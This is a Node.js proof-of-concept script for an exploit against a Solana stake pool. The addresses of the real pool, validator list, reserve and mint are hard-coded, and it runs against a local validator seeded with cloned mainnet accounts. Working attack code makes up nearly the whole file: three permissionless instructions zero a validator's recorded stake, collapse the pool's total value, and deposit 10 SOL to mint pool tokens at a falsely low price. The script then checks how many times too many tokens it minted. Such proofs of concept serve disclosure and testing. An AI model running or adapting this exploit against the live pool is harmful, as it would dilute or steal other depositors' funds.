#!/usr/bin/env node
/**
 * F-1 PoC — execute the permissionless attack on a LOCAL solana-test-validator
 * that was seeded with cloned mainnet accounts and the crafted precondition
 * (validator-list record 0 = DeactivatingValidator, stake account still active).
 *
 * Attack tx (all permissionless, fresh attacker keypair):
 *   1. UpdateValidatorListBalance{start_index:0, no_merge:false}  -> deployed v1.0.0
 *      bug zeroes record.active_stake_lamports while the stake account still holds it
 *   2. UpdateStakePoolBalance                                     -> total_lamports collapses
 *   3. DepositSol(10 SOL)                                         -> mints at the false price
 *
 * Asserts: minted YIELD >> fair NAV mint, and pool.total_lamports collapses to the reserve.
 */
const fs = require("fs");
const path = require("path");
const {
  Connection, PublicKey, Keypair, Transaction, TransactionInstruction, SystemProgram,
  SYSVAR_CLOCK_PUBKEY, SYSVAR_STAKE_HISTORY_PUBKEY, SYSVAR_RENT_PUBKEY, sendAndConfirmTransaction,
} = require("@solana/web3.js");

const PROG = new PublicKey("SPMBzsVUuoHA4Jm6KunbsotaahvVikZs1JyTW6iJvbn");
const POOL = new PublicKey("phasejkG1akKgqkLvfWzWY17evnH6mSWznnUspmpyeG");
const WITHDRAW_AUTH = new PublicKey("9HYjrCF5evTobLmay372kpUWSNTrtmDU2NkQtqjdnHKa");
const RESERVE = new PublicKey("phaseECAeXantYWXvRGkmeh7ddQsUJTf7DcywquY9Z2");
const VLIST = new PublicKey("phaseeExd43yGjjad2FZSigdG9UTRpMdxS4aMerx821");
const MINT = new PublicKey("phaseZSfPxTDBpiVb96H4XFSD8xHeHxZre5HerehBJG");
const MGR_FEE = new PublicKey("GAGMZfQU5ArnaciyQBnDLsEpbbhpyqPR24t98WYL4n6U");
const STAKE_ACCT = new PublicKey("8QtQ1U34DPs2UKQiwUoRPMHnjJedsmdASZdbQHa7VHKh");
const STAKE_PROG = new PublicKey("Stake11111111111111111111111111111111111111");
const TOKEN_PROG = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const SYSTEM = SystemProgram.programId;

const jstr = (o) => JSON.stringify(o, (k, v) => (typeof v === "bigint" ? v.toString() : v));
const u64le = (n) => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(n)); return b; };
const u32le = (n) => { const b = Buffer.alloc(4); b.writeUInt32LE(Number(n)); return b; };
const ix = (pid, keys, data) => new TransactionInstruction({
  programId: pid,
  keys: keys.map(([pubkey, isSigner, isWritable]) => ({ pubkey, isSigner, isWritable })),
  data,
});

function readPoolState(data) {
  return {
    total: data.readBigUInt64LE(258),
    supply: data.readBigUInt64LE(266),
    lastUpdateEpoch: data.readBigUInt64LE(274),
  };
}
function readVlistRecord0(data) {
  return {
    active: data.readBigUInt64LE(9),
    status: data[49],
  };
}

async function main() {
  const conn = new Connection("http://127.0.0.1:8899", "confirmed");
  const attacker = Keypair.generate();
  console.log("attacker:", attacker.publicKey.toBase58());
  const sig = await conn.requestAirdrop(attacker.publicKey, 200_000_000_000);
  await conn.confirmTransaction(sig, "confirmed");

  // attacker YIELD token account (created manually; avoids needing the ATA program)
  const tokenAcct = Keypair.generate();
  const rent165 = await conn.getMinimumBalanceForRentExemption(165);
  const createTokenIx = SystemProgram.createAccount({
    fromPubkey: attacker.publicKey, newAccountPubkey: tokenAcct.publicKey,
    lamports: rent165, space: 165, programId: TOKEN_PROG,
  });
  const initTokenIx = ix(TOKEN_PROG, [
    [tokenAcct.publicKey, false, true], [MINT, false, false],
    [attacker.publicKey, false, false], [SYSVAR_RENT_PUBKEY, false, false],
  ], Buffer.from([1])); // InitializeAccount
  await sendAndConfirmTransaction(conn, new Transaction().add(createTokenIx, initTokenIx), [attacker, tokenAcct], { commitment: "confirmed" });
  console.log("token account:", tokenAcct.publicKey.toBase58());

  // state before
  const poolBefore = readPoolState((await conn.getAccountInfo(POOL)).data);
  const vlistBefore = readVlistRecord0((await conn.getAccountInfo(VLIST)).data);
  const reserveBefore = (await conn.getBalance(RESERVE));
  console.log("BEFORE pool:", jstr(poolBefore), "vlist rec0:", jstr(vlistBefore), "reserve:", reserveBefore);

  // derived transient account address for (vote, pool, seed=0) — may not exist
  const { PublicKey: PK } = require("@solana/web3.js");
  const [transient] = PK.findProgramAddressSync(
    [Buffer.from("transient"), new PublicKey("CiTYUYPAPHdcri5yEfsmqVcs54J6j8X1QaiFLgYqMVe").toBuffer(), POOL.toBuffer(), u64le(0)],
    PROG);

  const DEPOSIT = 10_000_000_000n; // 10 SOL
  const updateVlistIx = ix(PROG, [
    [POOL, false, false], [WITHDRAW_AUTH, false, false], [VLIST, false, true], [RESERVE, false, true],
    [SYSVAR_CLOCK_PUBKEY, false, false], [SYSVAR_STAKE_HISTORY_PUBKEY, false, false], [STAKE_PROG, false, false],
    [STAKE_ACCT, false, true], [transient, false, true],
  ], Buffer.concat([Buffer.from([6]), u32le(0), Buffer.from([0])])); // UpdateValidatorListBalance{start_index:0,no_merge:false}

  const updatePoolIx = ix(PROG, [
    [POOL, false, true], [WITHDRAW_AUTH, false, false], [VLIST, false, true], [RESERVE, false, false],
    [MGR_FEE, false, true], [MINT, false, true], [TOKEN_PROG, false, false],
  ], Buffer.from([7])); // UpdateStakePoolBalance

  const depositIx = ix(PROG, [
    [POOL, false, true], [WITHDRAW_AUTH, false, false], [RESERVE, false, true],
    [attacker.publicKey, true, true], [tokenAcct.publicKey, false, true], [MGR_FEE, false, true],
    [tokenAcct.publicKey, false, true], [MINT, false, true], [SYSTEM, false, false], [TOKEN_PROG, false, false],
  ], Buffer.concat([Buffer.from([14]), u64le(DEPOSIT)])); // DepositSol

  const logsOf = async (sig) => {
    const t = await conn.getTransaction(sig, { maxSupportedTransactionVersion: 0, commitment: "confirmed" });
    return (t && t.meta && t.meta.logMessages) || [];
  };

  // tx1: permissionless crank (the F-1 step)
  const tx1 = new Transaction().add(updateVlistIx);
  const sig1 = await sendAndConfirmTransaction(conn, tx1, [attacker], { commitment: "confirmed" });
  const logs1 = await logsOf(sig1);
  const vlistAfterCrank = readVlistRecord0((await conn.getAccountInfo(VLIST)).data);
  console.log("crank tx:", sig1, "record0 after crank:", jstr(vlistAfterCrank));
  for (const l of logs1) console.log("  crank:", l);

  // tx2: refresh pool balance + deposit at the (possibly collapsed) price
  const tx2 = new Transaction().add(updatePoolIx, depositIx);
  const txSig = await sendAndConfirmTransaction(conn, tx2, [attacker], { commitment: "confirmed" });
  const logs2 = await logsOf(txSig);
  console.log("deposit tx:", txSig);
  for (const l of logs2) console.log("  deposit:", l);

  const poolAfter = readPoolState((await conn.getAccountInfo(POOL)).data);
  const vlistAfter = readVlistRecord0((await conn.getAccountInfo(VLIST)).data);
  const tokenAfter = await conn.getTokenAccountBalance(tokenAcct.publicKey);
  const reserveAfter = await conn.getBalance(RESERVE);

  const fairMint = (DEPOSIT * poolBefore.supply) / poolBefore.total;
  console.log("AFTER pool:", jstr(poolAfter), "vlist rec0:", jstr(vlistAfter));
  console.log("reserve after:", reserveAfter, "(+", Number(reserveAfter - reserveBefore) / 1e9, "SOL deposit)");
  console.log("attacker YIELD minted:", tokenAfter.value.amount, " fair-NAV would be:", fairMint.toString());
  const ratio = Number(BigInt(tokenAfter.value.amount) * 10000n / fairMint) / 10000;
  console.log("over-mint factor vs fair NAV:", ratio, "x");

  const ok =
    vlistAfter.active === 0n &&
    poolAfter.total < poolBefore.total / 100n && // collapsed to ~reserve
    BigInt(tokenAfter.value.amount) > fairMint * 10n;
  const result = {
    crank_tx: sig1, crank_logs: logs1, deposit_logs: logs2,
    attack_tx: txSig,
    pool_before: { total: poolBefore.total.toString(), supply: poolBefore.supply.toString() },
    pool_after: { total: poolAfter.total.toString(), supply: poolAfter.supply.toString() },
    vlist_record0_active_before: vlistBefore.active.toString(),
    vlist_record0_active_after: vlistAfter.active.toString(),
    reserve_before: reserveBefore, reserve_after: reserveAfter,
    minted: tokenAfter.value.amount, fair_nav_mint: fairMint.toString(),
    over_mint_factor: ratio,
    poc_success: ok,
  };
  fs.writeFileSync(path.join(__dirname, "..", "..", "ci-out", "f1_poc_result.json"), JSON.stringify(result, null, 2));
  console.log("POC SUCCESS:", ok);
  if (!ok) process.exit(1);
}

main().catch((e) => { console.error("FATAL", e); process.exit(1); });
